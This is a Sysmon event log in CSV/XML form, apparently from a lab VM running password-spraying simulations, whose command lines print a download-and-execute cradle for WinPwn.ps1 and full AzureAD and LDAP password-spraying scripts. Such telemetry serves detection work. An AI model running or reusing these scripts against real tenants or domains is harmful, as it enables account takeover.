Microsoft-Windows-Sysmon/Operational,"""powershell.exe"" & {$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
domainpassspray -consoleoutput -noninteractive -emptypasswords}",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows PowerShell,,,,,,1,19583,10.0.22621.2506 (WinBuild.160101.0800),"MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 20:53:33.740

ProcessGuid: {f57bd86a-8ecd-658c-cd01-000000000f00}

ProcessId: 1072

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Windows PowerShell

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: PowerShell.EXE

CommandLine: ""powershell.exe"" & {$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
domainpassspray -consoleoutput -noninteractive -emptypasswords}

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 1688

ParentImage: -

ParentCommandLine: -

ParentUser: -",Info,PowerShell.EXE,-,-,{00000000-0000-0000-0000-000000000000},1688,-,{f57bd86a-8ecd-658c-cd01-000000000f00},3588,1072,Microsoft® Windows® Operating System,,,,,"
      ",-,,,,,,2023-12-27T20:53:33.7419315Z,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 20:53:33.740,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T20:53:33.7419315Z""/>
      <EventRecordID>19583</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 20:53:33.740</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-8ecd-658c-cd01-000000000f00}</Data>
      <Data Name=""ProcessId"">1072</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Windows PowerShell</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">PowerShell.EXE</Data>
      <Data Name=""CommandLine"">""powershell.exe"" &amp; {$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
domainpassspray -consoleoutput -noninteractive -emptypasswords}</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20</Data>
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      <Data Name=""ParentProcessId"">1688</Data>
      <Data Name=""ParentImage"">-</Data>
      <Data Name=""ParentCommandLine"">-</Data>
      <Data Name=""ParentUser"">-</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 20:53:33.740

ProcessGuid: {f57bd86a-8ecd-658c-cd01-000000000f00}

ProcessId: 1072

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Windows PowerShell

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: PowerShell.EXE

CommandLine: ""powershell.exe"" &amp; {$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
domainpassspray -consoleoutput -noninteractive -emptypasswords}

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 1688

ParentImage: -

ParentCommandLine: -

ParentUser: -</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-27 20:53:32.123,,,,,,,,11,19582,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,0x8000000000000000,Information,,,"File created:

RuleName: -

UtcTime: 2023-12-27 20:53:32.123

ProcessGuid: {f57bd86a-8ecc-658c-cb01-000000000f00}

ProcessId: 1096

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_lmppxr24.vq1.ps1

CreationUtcTime: 2023-12-27 20:53:32.123

User: WINDEV2309EVAL\User",Info,,,,,,,{f57bd86a-8ecc-658c-cb01-000000000f00},3588,1096,,,,,,"
      ",-,,,,,,2023-12-27T20:53:32.1329789Z,C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_lmppxr24.vq1.ps1,File created (rule: FileCreate),,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 20:53:32.123,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>11</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>11</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T20:53:32.1329789Z""/>
      <EventRecordID>19582</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 20:53:32.123</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-8ecc-658c-cb01-000000000f00}</Data>
      <Data Name=""ProcessId"">1096</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_lmppxr24.vq1.ps1</Data>
      <Data Name=""CreationUtcTime"">2023-12-27 20:53:32.123</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>File created:

RuleName: -

UtcTime: 2023-12-27 20:53:32.123

ProcessGuid: {f57bd86a-8ecc-658c-cb01-000000000f00}

ProcessId: 1096

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_lmppxr24.vq1.ps1

CreationUtcTime: 2023-12-27 20:53:32.123

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>File created (rule: FileCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""powershell.exe"" & {Import-Module -Name AzureAD
$PWord = ConvertTo-SecureString -String \""""iamthebatman\"""" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \""""bruce.wayne@contoso.com\"""", $Pword
Connect-AzureAD -Credential $Credential > $null

($Users = Get-AzureADUser -All $true) > $null
Disconnect-AzureAD > $null
$PWord = ConvertTo-SecureString -String \""""P@ssw0rd!\"""" -AsPlainText -Force

$Users | Foreach-Object {
  $user = $_.UserPrincipalName
  $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \""""$user\"""", $Pword
  try {
    Write-Host \"""" [-] Attempting P@ssw0rd! on account ${user}.\""""
    Connect-AzureAD -Credential $Credential 2>&1> $null
    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
    Write-Host \"""" [!] ${user}:P@ssw0rd! are valid credentials!`r`n\""""
    Disconnect-AzureAD > $null
  } catch {
    Write-Host \"""" [-] ${user}:P@ssw0rd! invalid credentials.`r`n\""""
  }
}
Write-Host \""""End of password spraying\""""}",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows PowerShell,,,,,,1,19581,10.0.22621.2506 (WinBuild.160101.0800),"MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 20:53:32.016

ProcessGuid: {f57bd86a-8ecc-658c-cb01-000000000f00}

ProcessId: 1096

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Windows PowerShell

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: PowerShell.EXE

CommandLine: ""powershell.exe"" & {Import-Module -Name AzureAD
$PWord = ConvertTo-SecureString -String \""""iamthebatman\"""" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \""""bruce.wayne@contoso.com\"""", $Pword
Connect-AzureAD -Credential $Credential > $null

($Users = Get-AzureADUser -All $true) > $null
Disconnect-AzureAD > $null
$PWord = ConvertTo-SecureString -String \""""P@ssw0rd!\"""" -AsPlainText -Force

$Users | Foreach-Object {
  $user = $_.UserPrincipalName
  $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \""""$user\"""", $Pword
  try {
    Write-Host \"""" [-] Attempting P@ssw0rd! on account ${user}.\""""
    Connect-AzureAD -Credential $Credential 2>&1> $null
    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
    Write-Host \"""" [!] ${user}:P@ssw0rd! are valid credentials!`r`n\""""
    Disconnect-AzureAD > $null
  } catch {
    Write-Host \"""" [-] ${user}:P@ssw0rd! invalid credentials.`r`n\""""
  }
}
Write-Host \""""End of password spraying\""""}

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 1688

ParentImage: -

ParentCommandLine: -

ParentUser: -",Info,PowerShell.EXE,-,-,{00000000-0000-0000-0000-000000000000},1688,-,{f57bd86a-8ecc-658c-cb01-000000000f00},3588,1096,Microsoft® Windows® Operating System,,,,,"
      ",-,,,,,,2023-12-27T20:53:32.0175208Z,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 20:53:32.016,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T20:53:32.0175208Z""/>
      <EventRecordID>19581</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 20:53:32.016</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-8ecc-658c-cb01-000000000f00}</Data>
      <Data Name=""ProcessId"">1096</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Windows PowerShell</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">PowerShell.EXE</Data>
      <Data Name=""CommandLine"">""powershell.exe"" &amp; {Import-Module -Name AzureAD
$PWord = ConvertTo-SecureString -String \""""iamthebatman\"""" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \""""bruce.wayne@contoso.com\"""", $Pword
Connect-AzureAD -Credential $Credential &gt; $null

($Users = Get-AzureADUser -All $true) &gt; $null
Disconnect-AzureAD &gt; $null
$PWord = ConvertTo-SecureString -String \""""P@ssw0rd!\"""" -AsPlainText -Force

$Users | Foreach-Object {
  $user = $_.UserPrincipalName
  $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \""""$user\"""", $Pword
  try {
    Write-Host \"""" [-] Attempting P@ssw0rd! on account ${user}.\""""
    Connect-AzureAD -Credential $Credential 2&gt;&amp;1&gt; $null
    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
    Write-Host \"""" [!] ${user}:P@ssw0rd! are valid credentials!`r`n\""""
    Disconnect-AzureAD &gt; $null
  } catch {
    Write-Host \"""" [-] ${user}:P@ssw0rd! invalid credentials.`r`n\""""
  }
}
Write-Host \""""End of password spraying\""""}</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20</Data>
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      <Data Name=""ParentProcessId"">1688</Data>
      <Data Name=""ParentImage"">-</Data>
      <Data Name=""ParentCommandLine"">-</Data>
      <Data Name=""ParentUser"">-</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 20:53:32.016

ProcessGuid: {f57bd86a-8ecc-658c-cb01-000000000f00}

ProcessId: 1096

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Windows PowerShell

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: PowerShell.EXE

CommandLine: ""powershell.exe"" &amp; {Import-Module -Name AzureAD
$PWord = ConvertTo-SecureString -String \""""iamthebatman\"""" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \""""bruce.wayne@contoso.com\"""", $Pword
Connect-AzureAD -Credential $Credential &gt; $null

($Users = Get-AzureADUser -All $true) &gt; $null
Disconnect-AzureAD &gt; $null
$PWord = ConvertTo-SecureString -String \""""P@ssw0rd!\"""" -AsPlainText -Force

$Users | Foreach-Object {
  $user = $_.UserPrincipalName
  $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \""""$user\"""", $Pword
  try {
    Write-Host \"""" [-] Attempting P@ssw0rd! on account ${user}.\""""
    Connect-AzureAD -Credential $Credential 2&gt;&amp;1&gt; $null
    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
    Write-Host \"""" [!] ${user}:P@ssw0rd! are valid credentials!`r`n\""""
    Disconnect-AzureAD &gt; $null
  } catch {
    Write-Host \"""" [-] ${user}:P@ssw0rd! invalid credentials.`r`n\""""
  }
}
Write-Host \""""End of password spraying\""""}

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 1688

ParentImage: -

ParentCommandLine: -

ParentUser: -</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-27 20:53:30.179,,,,,,,,11,19580,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,0x8000000000000000,Information,,,"File created:

RuleName: -

UtcTime: 2023-12-27 20:53:30.179

ProcessGuid: {f57bd86a-8eca-658c-c901-000000000f00}

ProcessId: 3088

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_h5cf4dpr.gp4.ps1

CreationUtcTime: 2023-12-27 20:53:30.179

User: WINDEV2309EVAL\User",Info,,,,,,,{f57bd86a-8eca-658c-c901-000000000f00},3588,3088,,,,,,"
      ",-,,,,,,2023-12-27T20:53:30.1912027Z,C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_h5cf4dpr.gp4.ps1,File created (rule: FileCreate),,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 20:53:30.179,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>11</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>11</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T20:53:30.1912027Z""/>
      <EventRecordID>19580</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 20:53:30.179</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-8eca-658c-c901-000000000f00}</Data>
      <Data Name=""ProcessId"">3088</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_h5cf4dpr.gp4.ps1</Data>
      <Data Name=""CreationUtcTime"">2023-12-27 20:53:30.179</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>File created:

RuleName: -

UtcTime: 2023-12-27 20:53:30.179

ProcessGuid: {f57bd86a-8eca-658c-c901-000000000f00}

ProcessId: 3088

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_h5cf4dpr.gp4.ps1

CreationUtcTime: 2023-12-27 20:53:30.179

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>File created (rule: FileCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""powershell.exe"" & {if (\""""NTLM\"""".ToLower() -NotIn @(\""""ntlm\"""",\""""kerberos\"""")) {
  Write-Host \""""Only 'NTLM' and 'Kerberos' auth methods are supported\""""
  exit 1
}

$DomainUsers = Get-ADUser -LDAPFilter '(&(sAMAccountType=805306368)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' -Server $env:UserDnsDomain | Select-Object -ExpandProperty SamAccountName

[System.Reflection.Assembly]::LoadWithPartialName(\""""System.DirectoryServices.Protocols\"""") | Out-Null
$di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier(\""""$env:UserDnsDomain\"""",389)

$DomainUsers | Foreach-Object {
  $user = $_
  $password = 'P@ssw0rd!'

  $credz = new-object System.Net.NetworkCredential($user, $password, \""""$env:UserDnsDomain\"""")
  $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::NTLM)
  try {
    Write-Host \"""" [-] Attempting ${password} on account ${user}.\""""
    $conn.bind()
    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
    Write-Host \"""" [!] ${user}:${password} are valid credentials!\""""
  } catch {
    Write-Host $_.Exception.Message
  }
}
Write-Host \""""End of password spraying\""""}",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows PowerShell,,,,,,1,19579,10.0.22621.2506 (WinBuild.160101.0800),"MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 20:53:30.065

ProcessGuid: {f57bd86a-8eca-658c-c901-000000000f00}

ProcessId: 3088

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Windows PowerShell

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: PowerShell.EXE

CommandLine: ""powershell.exe"" & {if (\""""NTLM\"""".ToLower() -NotIn @(\""""ntlm\"""",\""""kerberos\"""")) {
  Write-Host \""""Only 'NTLM' and 'Kerberos' auth methods are supported\""""
  exit 1
}

$DomainUsers = Get-ADUser -LDAPFilter '(&(sAMAccountType=805306368)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' -Server $env:UserDnsDomain | Select-Object -ExpandProperty SamAccountName

[System.Reflection.Assembly]::LoadWithPartialName(\""""System.DirectoryServices.Protocols\"""") | Out-Null
$di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier(\""""$env:UserDnsDomain\"""",389)

$DomainUsers | Foreach-Object {
  $user = $_
  $password = 'P@ssw0rd!'

  $credz = new-object System.Net.NetworkCredential($user, $password, \""""$env:UserDnsDomain\"""")
  $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::NTLM)
  try {
    Write-Host \"""" [-] Attempting ${password} on account ${user}.\""""
    $conn.bind()
    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
    Write-Host \"""" [!] ${user}:${password} are valid credentials!\""""
  } catch {
    Write-Host $_.Exception.Message
  }
}
Write-Host \""""End of password spraying\""""}

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 1688

ParentImage: -

ParentCommandLine: -

ParentUser: -",Info,PowerShell.EXE,-,-,{00000000-0000-0000-0000-000000000000},1688,-,{f57bd86a-8eca-658c-c901-000000000f00},3588,3088,Microsoft® Windows® Operating System,,,,,"
      ",-,,,,,,2023-12-27T20:53:30.0670431Z,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 20:53:30.065,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T20:53:30.0670431Z""/>
      <EventRecordID>19579</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 20:53:30.065</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-8eca-658c-c901-000000000f00}</Data>
      <Data Name=""ProcessId"">3088</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Windows PowerShell</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">PowerShell.EXE</Data>
      <Data Name=""CommandLine"">""powershell.exe"" &amp; {if (\""""NTLM\"""".ToLower() -NotIn @(\""""ntlm\"""",\""""kerberos\"""")) {
  Write-Host \""""Only 'NTLM' and 'Kerberos' auth methods are supported\""""
  exit 1
}

$DomainUsers = Get-ADUser -LDAPFilter '(&amp;(sAMAccountType=805306368)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' -Server $env:UserDnsDomain | Select-Object -ExpandProperty SamAccountName

[System.Reflection.Assembly]::LoadWithPartialName(\""""System.DirectoryServices.Protocols\"""") | Out-Null
$di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier(\""""$env:UserDnsDomain\"""",389)

$DomainUsers | Foreach-Object {
  $user = $_
  $password = 'P@ssw0rd!'

  $credz = new-object System.Net.NetworkCredential($user, $password, \""""$env:UserDnsDomain\"""")
  $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::NTLM)
  try {
    Write-Host \"""" [-] Attempting ${password} on account ${user}.\""""
    $conn.bind()
    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
    Write-Host \"""" [!] ${user}:${password} are valid credentials!\""""
  } catch {
    Write-Host $_.Exception.Message
  }
}
